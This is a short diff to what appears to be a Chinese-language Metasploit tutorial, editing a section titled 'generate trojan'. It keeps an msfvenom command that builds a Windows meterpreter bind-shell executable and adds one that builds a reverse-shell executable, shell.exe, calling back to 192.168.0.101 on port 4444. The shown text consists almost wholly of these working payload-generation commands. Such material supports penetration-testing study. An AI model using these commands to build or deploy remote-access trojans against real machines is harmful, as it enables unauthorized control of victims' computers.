@@ -75,9 +75,12 @@ version |  显示框架和控制台库版本号
 ```bash
 msfvenom -l  payload | grep window
 ```
-**生成木马**(正向连接型)
+**生成木马**
+
 ```bash
-msfvenom -p windows/x64/meterpreter/bind_tcp  lport=60005 -f exe -o test.exe
+msfvenom -p windows/x64/meterpreter/bind_tcp  lport=60005 -f exe -o test.exe //正向
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.101 lport=4444 -f exe -o shell.exe //反向
 ```
 **配置Meterpreter**
 ```bash
